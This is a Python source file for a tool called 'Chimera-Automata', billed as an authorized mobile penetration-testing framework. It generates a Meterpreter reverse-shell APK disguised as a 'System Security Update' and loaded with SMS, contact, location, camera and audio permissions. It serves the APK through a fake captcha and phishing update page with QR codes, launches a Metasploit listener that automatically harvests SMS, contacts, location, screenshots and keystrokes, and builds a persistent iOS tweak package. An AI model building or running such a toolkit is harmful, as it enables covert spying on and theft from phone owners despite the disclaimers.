#!/usr/bin/env python3
# main.py - Chimera-Automata Main Controller
# FOR EDUCATIONAL PURPOSES ONLY

"""
████████████████████████████████████████████████████████████████████████████████
█                                                                              █
█                     CHIMERA-AUTOMATA v1.0                                    █
█              Automated Mobile Security Testing Framework                     █
█                                                                              █
█         WARNING: FOR AUTHORIZED PENETRATION TESTING ONLY!                   █
█         Using this tool against systems you don't own is ILLEGAL!           █
█                                                                              █
████████████████████████████████████████████████████████████████████████████████
"""

import os
import sys
import json
import time
import random
import string
import subprocess
import threading
import socket
import signal
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# Third-party imports
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    import qrcode
    from flask import Flask, request, render_template_string, redirect, session, send_file, Response
    import requests
    from cryptography.fernet import Fernet
    import netifaces
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("[*] Run: pip install -r requirements.txt")
    sys.exit(1)

# Initialize Rich console
console = Console()

# Colors for terminal (fallback if rich not available)
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class ChimeraAutomata:
    def __init__(self):
        self.project_root = Path.home() / "chimera-automata"
        self.current_payload = None
        self.c2_ip = self.get_local_ip()
        self.c2_port = 8443
        self.web_port = 8080
        self.session_id = self.generate_session_id()
        self.active_sessions = []
        self.web_server = None
        self.config = self.load_config()
        self.setup_directories()
        
    def show_banner(self):
        """Display the main banner"""
        banner = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██████╗██╗  ██╗██╗███╗   ███╗███████╗██████╗  █████╗                       ║
║  ██╔════╝██║  ██║██║████╗ ████║██╔════╝██╔══██╗██╔══██╗                      ║
║  ██║     ███████║██║██╔████╔██║█████╗  ██████╔╝███████║                      ║
║  ██║     ██╔══██║██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║                      ║
║  ╚██████╗██║  ██║██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║                      ║
║   ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                      ║
║                                                                               ║
║                     █████╗ ██╗   ██╗████████╗ ██████╗███╗   ███╗ █████╗      ║
║                    ██╔══██╗██║   ██║╚══██╔══╝██╔════╝████╗ ████║██╔══██╗     ║
║                    ███████║██║   ██║   ██║   ██║     ██╔████╔██║███████║     ║
║                    ██╔══██║██║   ██║   ██║   ██║     ██║╚██╔╝██║██╔══██║     ║
║                    ██║  ██║╚██████╔╝   ██║   ╚██████╗██║ ╚═╝ ██║██║  ██║     ║
║                    ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝╚═╝     ╚═╝╚═╝  ╚═╝     ║
║                                                                               ║
║               Version 1.0 | Educational & Authorized Testing Only            ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
        """
        console.print(Panel(banner, style="bold red"))
        
        warning = Panel.fit(
            "[bold yellow]⚠  WARNING: FOR AUTHORIZED PENETRATION TESTING ONLY! ⚠[/bold yellow]\n"
            "Using this tool against systems without explicit permission is:\n"
            "• [red]ILLEGAL[/red] (CFAA violations, up to 10 years imprisonment)\n"
            "• [red]UNETHICAL[/red]\n"
            "• [red]PUNISHABLE BY LAW[/red]\n\n"
            "You assume [bold]FULL RESPONSIBILITY[/bold] for your actions.",
            title="Legal Notice",
            border_style="red"
        )
        console.print(warning)
        
        if not Confirm.ask("[bold]Do you agree to use this only for authorized testing?[/bold]"):
            console.print("[red]Exiting...[/red]")
            sys.exit(0)
    
    def load_config(self) -> Dict:
        """Load configuration file"""
        config_path = self.project_root / "configs" / "main_config.json"
        if config_path.exists():
            with open(config_path, 'r') as f:
                return json.load(f)
        return {
            "project_name": "Chimera-Automata",
            "version": "1.0.0",
            "legal_warning": "FOR AUTHORIZED TESTING ONLY",
            "web_port": 8080,
            "c2_port": 8443,
            "default_lhost": "auto",
            "keystore_pass": "chimera_secure_123",
            "auto_start_servers": True,
            "log_level": "INFO"
        }
    
    def setup_directories(self):
        """Create necessary directories"""
        dirs = [
            "android_factory/payloads",
            "android_factory/decompiled",
            "ios_factory/payloads",
            "web_server/templates",
            "web_server/static",
            "c2_server/sessions",
            "logs",
            "db",
            "output/apks",
            "output/debs",
            "qr_codes",
            "templates",
            "modules/android",
            "modules/ios",
            "configs",
            "scripts"
        ]
        
        for dir_path in dirs:
            (self.project_root / dir_path).mkdir(parents=True, exist_ok=True)
    
    def get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            # Try to get non-loopback address
            interfaces = netifaces.interfaces()
            for interface in interfaces:
                if interface == 'lo':
                    continue
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip = addr['addr']
                        if not ip.startswith('127.'):
                            return ip
        except:
            pass
        
        # Fallback method
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def generate_session_id(self) -> str:
        """Generate unique session ID"""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"chimera_{timestamp}_{random_str}"
    
    def android_workflow(self):
        """Complete Android payload creation workflow"""
        console.print(Panel.fit("[bold cyan]Android Payload Factory[/bold cyan]", border_style="cyan"))
        
        # Get user input
        app_name = Prompt.ask("[yellow][?] Enter fake app name[/yellow]", default="System Security Update v5.2")
        package_name = Prompt.ask("[yellow][?] Enter package name[/yellow]", default="com.android.system.security.update")
        version_code = Prompt.ask("[yellow][?] Enter version code[/yellow]", default="52")
        
        console.print("\n[bold blue][*] Starting Android payload creation...[/bold blue]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
        ) as progress:
            task1 = progress.add_task("[cyan]Generating Meterpreter payload...", total=None)
            
            # Step 1: Generate base payload
            payload_dir = self.project_root / "android_factory" / "payloads"
            base_apk = payload_dir / f"base_{self.session_id}.apk"
            
            msfvenom_cmd = [
                "msfvenom", "-p", "android/meterpreter/reverse_https",
                f"LHOST={self.c2_ip}", f"LPORT={self.c2_port}",
                "-o", str(base_apk)
            ]
            
            try:
                result = subprocess.run(msfvenom_cmd, capture_output=True, text=True)
                if result.returncode != 0:
                    console.print("[red][!] Failed to generate payload[/red]")
                    console.print(f"[red]Error: {result.stderr}[/red]")
                    return
                
                progress.update(task1, completed=100, description="[green]Payload generated![/green]")
            except Exception as e:
                console.print(f"[red][!] Error: {e}[/red]")
                return
        
        # Step 2: Decompile
        console.print("[blue][*] Decompiling APK...[/blue]")
        decompiled_dir = self.project_root / "android_factory" / "decompiled" / self.session_id
        
        decompile_cmd = ["apktool", "d", str(base_apk), "-o", str(decompiled_dir), "-f"]
        subprocess.run(decompile_cmd, capture_output=True)
        
        # Step 3: Inject modifications
        self.inject_android_modifications(decompiled_dir, app_name, package_name, version_code)
        
        # Step 4: Rebuild
        console.print("[blue][*] Rebuilding APK...[/blue]")
        rebuilt_apk = self.project_root / "output" / "apks" / f"{app_name.replace(' ', '_')}.apk"
        
        rebuild_cmd = ["apktool", "b", str(decompiled_dir), "-o", str(rebuilt_apk)]
        subprocess.run(rebuild_cmd, capture_output=True)
        
        # Step 5: Sign APK
        console.print("[blue][*] Signing APK...[/blue]")
        keystore = self.project_root / "android_factory" / "chimera.keystore"
        
        sign_cmd = [
            "apksigner", "sign",
            "--ks", str(keystore),
            "--ks-pass", f"pass:{self.config['keystore_pass']}",
            "--key-pass", f"pass:{self.config['keystore_pass']}",
            str(rebuilt_apk)
        ]
        
        subprocess.run(sign_cmd, capture_output=True)
        
        # Step 6: Zipalign
        console.print("[blue][*] Optimizing APK...[/blue]")
        final_apk = self.project_root / "output" / "apks" / f"FINAL_{app_name.replace(' ', '_')}.apk"
        
        align_cmd = ["zipalign", "-v", "4", str(rebuilt_apk), str(final_apk)]
        subprocess.run(align_cmd, capture_output=True)
        
        self.current_payload = final_apk
        
        console.print(f"[green][+] Android payload created: {final_apk}[/green]")
        
        # Generate download page
        self.generate_android_download_page(final_apk, app_name)
        
        return final_apk
    
    def inject_android_modifications(self, decompiled_dir: Path, app_name: str, package_name: str, version_code: str):
        """Inject modifications into decompiled APK"""
        console.print("[blue][*] Injecting modifications...[/blue]")
        
        # Modify AndroidManifest.xml
        manifest_path = decompiled_dir / "AndroidManifest.xml"
        if manifest_path.exists():
            with open(manifest_path, 'r') as f:
                content = f.read()
            
            # Add permissions
            permissions = [
                '<uses-permission android:name="android.permission.INTERNET"/>',
                '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>',
                '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
                '<uses-permission android:name="android.permission.READ_SMS"/>',
                '<uses-permission android:name="android.permission.SEND_SMS"/>',
                '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
                '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
                '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>',
                '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
                '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
                '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
                '<uses-permission android:name="android.permission.CAMERA"/>',
                '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
                '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
                '<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>',
                '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>',
                '<uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>',
            ]
            
            for perm in permissions:
                if perm not in content:
                    content = content.replace('</manifest>', f'    {perm}\n</manifest>')
            
            # Update app name and package
            content = content.replace('android:label="App"', f'android:label="{app_name}"')
            
            with open(manifest_path, 'w') as f:
                f.write(content)
        
        # Create smali modifications directory
        smali_dir = decompiled_dir / "smali"
        if smali_dir.exists():
            # Create Captcha activity directory structure
            package_path = package_name.replace('.', '/')
            activity_dir = smali_dir / package_path
            activity_dir.mkdir(parents=True, exist_ok=True)
            
            # Create simple Captcha activity (theoretical)
            captcha_smali = f""".class public L{package_path}/CaptchaActivity;
.super Landroid/app/Activity;

.method public onCreate(Landroid/os/Bundle;)V
    .locals 2
    
    .prologue
    .line 1
    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    
    .line 2
    const-string v0, "Starting security verification..."
    invoke-static {{p0, v0}}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;)Landroid/widget/Toast;
    
    .line 3
    # Background service start would go here
    .line 4
    return-void
.end method
"""
            
            captcha_file = activity_dir / "CaptchaActivity.smali"
            captcha_file.write_text(captcha_smali)
        
        # Create assets directory for additional files
        assets_dir = decompiled_dir / "assets"
        assets_dir.mkdir(exist_ok=True)
        
        # Create configuration file
        config_content = {
            "app_name": app_name,
            "package": package_name,
            "c2_server": f"{self.c2_ip}:{self.c2_port}",
            "session_id": self.session_id,
            "install_time": datetime.now().isoformat()
        }
        
        config_file = assets_dir / "chimera_config.json"
        config_file.write_text(json.dumps(config_content, indent=2))
        
        console.print("[green][+] Modifications injected[/green]")
    
    def generate_android_download_page(self, apk_path: Path, app_name: str):
        """Generate HTML download page for Android"""
        console.print("[blue][*] Generating download page...[/blue]")
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Update Required</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 500px;
            width: 90%;
        }}
        .logo {{
            font-size: 48px;
            margin-bottom: 20px;
        }}
        h1 {{
            color: #333;
            margin-bottom: 10px;
        }}
        p {{
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
        }}
        .btn {{
            background: #4CAF50;
            color: white;
            padding: 15px 40px;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s;
        }}
        .btn:hover {{
            background: #45a049;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }}
        .warning {{
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h1>Critical Security Update</h1>
        <p>Your device requires an important security patch to protect against recent vulnerabilities.</p>
        <p><strong>Update:</strong> {app_name}</p>
        <p><strong>Size:</strong> 12.4 MB</p>
        
        <a href="/download/android" class="btn">Download & Install Update</a>
        
        <div class="warning">
            <strong>⚠ Note:</strong> You may need to enable "Install from Unknown Sources" in Settings > Security before installing this update.
        </div>
        
        <p style="margin-top: 30px; font-size: 12px; color: #999;">
            This update is provided by Android Security Services
        </p>
    </div>
</body>
</html>"""
        
        # Save HTML file
        html_path = self.project_root / "web_server" / "templates" / "android_download.html"
        html_path.write_text(html_content)
        
        console.print(f"[green][+] Download page created: {html_path}[/green]")
        return html_path
    
    def launch_web_server(self):
        """Launch Flask web server"""
        console.print(Panel.fit("[bold cyan]Web Server Control[/bold cyan]", border_style="cyan"))
        
        # Check if web server is already running
        try:
            response = requests.get(f"http://{self.c2_ip}:{self.web_port}", timeout=2)
            if response.status_code < 400:
                console.print("[yellow][!] Web server appears to be already running[/yellow]")
                return True
        except:
            pass
        
        console.print("[blue][*] Starting web server...[/blue]")
        
        # Create Flask app
        app = Flask(__name__)
        app.secret_key = self.session_id
        
        @app.route('/')
        def index():
            user_agent = request.headers.get('User-Agent', '').lower()
            
            if 'android' in user_agent:
                device_type = 'android'
            elif 'iphone' in user_agent or 'ipad' in user_agent:
                device_type = 'ios'
            else:
                device_type = 'unknown'
            
            session['device_type'] = device_type
            
            # Serve appropriate page
            if device_type == 'android':
                html_path = self.project_root / "web_server" / "templates" / "android_download.html"
                if html_path.exists():
                    return html_path.read_text()
            
            # Default captcha page
            captcha_html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Security Verification</title>
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
                    .box { background: #f8f9fa; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
                    h2 { color: #333; }
                    .puzzle { background: white; padding: 20px; margin: 20px 0; border-radius: 5px; }
                    button { background: #007bff; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; }
                    button:hover { background: #0056b3; }
                </style>
            </head>
            <body>
                <div class="box">
                    <h2>🔐 Security Verification Required</h2>
                    <p>Complete verification to access the content</p>
                    
                    <div class="puzzle">
                        <p>Are you human? Click VERIFY to continue</p>
                    </div>
                    
                    <form method="POST" action="/verify">
                        <button type="submit">VERIFY</button>
                    </form>
                </div>
            </body>
            </html>"""
            
            return captcha_html
        
        @app.route('/verify', methods=['POST'])
        def verify():
            device = session.get('device_type', 'unknown')
            
            if device == 'android':
                return redirect('/download/android')
            elif device == 'ios':
                return redirect('/download/ios')
            else:
                return "Device not supported", 400
        
        @app.route('/download/android')
        def download_android():
            if self.current_payload and self.current_payload.exists():
                return send_file(
                    str(self.current_payload),
                    as_attachment=True,
                    download_name="System_Security_Update.apk"
                )
            return "Update not available", 404
        
        @app.route('/download/ios')
        def download_ios():
            return """
            <h2>iOS Security Update</h2>
            <p>For iOS devices, please visit the App Store for security updates.</p>
            <p>Alternatively, for advanced users on jailbroken devices:</p>
            <pre>
            1. Open Cydia
            2. Add source: https://chimera.example.com/
            3. Search for "System Update"
            4. Install package
            </pre>
            """
        
        # Run Flask in background thread
        def run_flask():
            app.run(
                host='0.0.0.0',
                port=self.web_port,
                debug=False,
                threaded=True,
                use_reloader=False
            )
        
        self.web_server = threading.Thread(target=run_flask, daemon=True)
        self.web_server.start()
        
        # Wait for server to start
        time.sleep(2)
        
        console.print(f"[green][+] Web server started on http://{self.c2_ip}:{self.web_port}[/green]")
        console.print(f"[green][+] Android download: http://{self.c2_ip}:{self.web_port}/download/android[/green]")
        
        return True
    
    def generate_qr_code(self):
        """Generate QR code for the current web server"""
        console.print(Panel.fit("[bold cyan]QR Code Generator[/bold cyan]", border_style="cyan"))
        
        url = f"http://{self.c2_ip}:{self.web_port}"
        
        console.print(f"[blue][*] Generating QR code for: {url}[/blue]")
        
        # Generate QR code
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(url)
        qr.make(fit=True)
        
        # Save as image
        img = qr.make_image(fill_color="black", back_color="white")
        qr_path = self.project_root / "qr_codes" / f"{self.session_id}.png"
        img.save(str(qr_path))
        
        # Display ASCII QR
        console.print("\n[yellow]ASCII QR Code:[/yellow]")
        qr.print_ascii()
        
        console.print(f"\n[green][+] QR code saved: {qr_path}[/green]")
        console.print(f"[green][+] URL: {url}[/green]")
        
        # Display image path for opening
        console.print(f"\n[blue]To view QR image:[/blue]")
        console.print(f"xdg-open {qr_path}  # Linux")
        console.print(f"open {qr_path}      # macOS")
        
        return qr_path
    
    def start_metasploit_listener(self):
        """Start Metasploit listener for Android payload"""
        console.print(Panel.fit("[bold cyan]Metasploit Listener[/bold cyan]", border_style="cyan"))
        
        # Create resource file
        resource_file = self.project_root / "c2_server" / f"listener_{self.session_id}.rc"
        
        rc_content = f"""use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST {self.c2_ip}
set LPORT {self.c2_port}
set ExitOnSession false
set AutoRunScript multi_console_command -rc {self.project_root}/c2_server/post_exploit.rc
exploit -j
"""
        
        resource_file.write_text(rc_content)
        
        # Create post-exploitation script
        post_exploit = self.project_root / "c2_server" / "post_exploit.rc"
        post_content = """# Post-exploitation automation
run post/android/manage/root
run post/android/gather/sms
run post/android/gather/contacts
run post/android/gather/location
screenshot
webcam_list
keyscan_start
"""
        
        post_exploit.write_text(post_content)
        
        console.print("[green][+] Metasploit resource file created[/green]")
        console.print(f"[blue][*] Resource file: {resource_file}[/blue]")
        
        # Start Metasploit in tmux session
        console.print("\n[yellow]Starting Metasploit in background...[/yellow]")
        
        tmux_cmd = f"tmux new-session -d -s chimera_listener 'msfconsole -q -r {resource_file}'"
        subprocess.run(tmux_cmd, shell=True)
        
        console.print("[green][+] Metasploit listener started in tmux session 'chimera_listener'[/green]")
        console.print(f"[blue][*] To attach to listener: tmux attach -t chimera_listener[/blue]")
        console.print(f"[blue][*] Listening on: {self.c2_ip}:{self.c2_port}[/blue]")
        
        return True
    
    def ios_workflow(self):
        """iOS payload workflow (for jailbroken devices only)"""
        console.print(Panel.fit("[bold cyan]iOS Payload Factory[/bold cyan]", border_style="cyan"))
        console.print("[yellow][!] WARNING: iOS payloads only work on JAILBROKEN devices[/yellow]")
        console.print("[yellow][!] This is for EDUCATIONAL PURPOSES only[/yellow]")
        
        if not Confirm.ask("[bold]Continue with iOS payload creation?[/bold]"):
            return
        
        app_name = Prompt.ask("[yellow][?] Enter app name[/yellow]", default="System Optimizer")
        bundle_id = Prompt.ask("[yellow][?] Enter bundle ID[/yellow]", default="com.ios.optimizer")
        
        console.print("\n[blue][*] Creating iOS payload structure...[/blue]")
        
        # Create .deb package structure for Cydia
        deb_dir = self.project_root / "ios_factory" / f"payload_{self.session_id}"
        deb_dir.mkdir(parents=True, exist_ok=True)
        
        # Create DEBIAN control file
        control_content = f"""Package: {bundle_id}
Version: 1.0
Section: Utilities
Architecture: iphoneos-arm
Name: {app_name}
Description: System optimization utility
Author: Chimera-Automata
Maintainer: Chimera-Automata
Depends: firmware (>= 11.0), mobilesubstrate
"""
        
        control_file = deb_dir / "DEBIAN" / "control"
        control_file.parent.mkdir(parents=True, exist_ok=True)
        control_file.write_text(control_content)
        
        # Create post-install script
        postinst = deb_dir / "DEBIAN" / "postinst"
        postinst_content = """#!/bin/bash
echo "[*] Installing system optimizer..."
# Load MobileSubstrate tweak
if [ -f /Library/MobileSubstrate/DynamicLibraries/chimera.dylib ]; then
    launchctl unload /Library/LaunchDaemons/com.chimera.plist 2>/dev/null
    launchctl load /Library/LaunchDaemons/com.chimera.plist
fi
exit 0
"""
        postinst.write_text(postinst_content)
        postinst.chmod(0o755)
        
        # Create dummy dylib (in real scenario, this would be compiled Mach-O)
        dylib_dir = deb_dir / "Library" / "MobileSubstrate" / "DynamicLibraries"
        dylib_dir.mkdir(parents=True, exist_ok=True)
        
        dylib_file = dylib_dir / "chimera.dylib"
        dylib_file.write_text("MACHO_BINARY_PLACEHOLDER")
        
        # Create plist
        plist_dir = deb_dir / "Library" / "LaunchDaemons"
        plist_dir.mkdir(parents=True, exist_ok=True)
        
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{bundle_id}.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/chimera_agent</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
        
        plist_file = plist_dir / f"{bundle_id}.plist"
        plist_file.write_text(plist_content)
        
        # Build .deb package
        output_deb = self.project_root / "output" / "debs" / f"{app_name.replace(' ', '_')}.deb"
        
        build_cmd = ["dpkg-deb", "-b", str(deb_dir), str(output_deb)]
        subprocess.run(build_cmd, capture_output=True)
        
        console.print(f"[green][+] iOS payload created: {output_deb}[/green]")
        console.print("[yellow][!] Note: This .deb file is for JAILBROKEN devices only[/yellow]")
        console.print("[yellow][!] Install via Cydia on jailbroken device[/yellow]")
        
        return output_deb
    
    def show_status(self):
        """Show current system status"""
        table = Table(title="Chimera-Automata Status")
        table.add_column("Component", style="cyan")
        table.add_column("Status", style="green")
        table.add_column("Details", style="yellow")
        
        # Web server status
        try:
            requests.get(f"http://{self.c2_ip}:{self.web_port}", timeout=1)
            web_status = "RUNNING"
        except:
            web_status = "STOPPED"
        
        # Metasploit status
        msf_status = "UNKNOWN"
        try:
            result = subprocess.run(["tmux", "has-session", "-t", "chimera_listener"], 
                                  capture_output=True)
            msf_status = "RUNNING" if result.returncode == 0 else "STOPPED"
        except:
            pass
        
        table.add_row("Web Server", web_status, f"http://{self.c2_ip}:{self.web_port}")
        table.add_row("C2 Listener", msf_status, f"{self.c2_ip}:{self.c2_port}")
        table.add_row("Session ID", "ACTIVE", self.session_id)
        table.add_row("Payload", "READY" if self.current_payload else "NONE", 
                     str(self.current_payload) if self.current_payload else "No payload")
        
        console.print(table)
    
    def interactive_menu(self):
        """Main interactive menu"""
        while True:
            console.print("\n" + "="*80)
            console.print("[bold cyan]CHIMERA-AUTOMATA MAIN MENU[/bold cyan]")
            console.print("="*80)
            
            menu_options = [
                ("1", "📱 Android Payload Factory"),
                ("2", "🍎 iOS Payload Factory (Jailbroken)"),
                ("3", "🌐 Launch Web Server"),
                ("4", "📷 Generate QR Code"),
                ("5", "👂 Start Metasploit Listener"),
                ("6", "📊 Show Status"),
                ("7", "⚙️ Configure Settings"),
                ("8", "📁 Open Output Directory"),
                ("9", "❌ Exit")
            ]
            
            for num, desc in menu_options:
                console.print(f"[bold blue]{num}[/bold blue]. {desc}")
            
            console.print("\n" + "-"*80)
            
            choice = Prompt.ask("[bold yellow]Select option[/bold yellow]", 
                              choices=[str(i) for i in range(1, 10)])
            
            if choice == "1":
                self.android_workflow()
            elif choice == "2":
                self.ios_workflow()
            elif choice == "3":
                self.launch_web_server()
            elif choice == "4":
                self.generate_qr_code()
            elif choice == "5":
                self.start_metasploit_listener()
            elif choice == "6":
                self.show_status()
            elif choice == "7":
                self.configure_settings()
            elif choice == "8":
                subprocess.run(["xdg-open", str(self.project_root / "output")])
            elif choice == "9":
                console.print("[red]Exiting...[/red]")
                break
    
    def configure_settings(self):
        """Configure tool settings"""
        console.print(Panel.fit("[bold cyan]Configuration[/bold cyan]", border_style="cyan"))
        
        table = Table(title="Current Settings")
        table.add_column("Setting", style="cyan")
        table.add_column("Value", style="yellow")
        
        for key, value in self.config.items():
            table.add_row(key, str(value))
        
        console.print(table)
        
        if Confirm.ask("[bold]Edit settings?[/bold]"):
            new_port = Prompt.ask("[yellow]Web server port[/yellow]", default=str(self.web_port))
            self.web_port = int(new_port)
            self.config['web_port'] = self.web_port
            
            new_c2_port = Prompt.ask("[yellow]C2 listener port[/yellow]", default=str(self.c2_port))
            self.c2_port = int(new_c2_port)
            self.config['c2_port'] = self.c2_port
            
            # Save config
            config_path = self.project_root / "configs" / "main_config.json"
            config_path.write_text(json.dumps(self.config, indent=2))
            
            console.print("[green][+] Configuration saved[/green]")

def main():
    """Main entry point"""
    # Clear screen
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Create and run Chimera
    chimera = ChimeraAutomata()
    chimera.show_banner()
    
    # Check for updates
    console.print("[blue][*] Checking system requirements...[/blue]")
    
    # Verify required tools
    required_tools = ['msfvenom', 'apktool', 'keytool', 'zipalign', 'apksigner']
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run([tool, '--version'], capture_output=True)
        except FileNotFoundError:
            missing_tools.append(tool)
    
    if missing_tools:
        console.print("[red][!] Missing required tools:[/red]")
        for tool in missing_tools:
            console.print(f"  - {tool}")
        console.print("[yellow][*] Run setup.sh to install dependencies[/yellow]")
        
        if not Confirm.ask("[bold]Continue anyway?[/bold]"):
            sys.exit(1)
    
    # Start interactive menu
    chimera.interactive_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Interrupted by user[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red][!] Error: {e}[/red]")
        sys.exit(1)
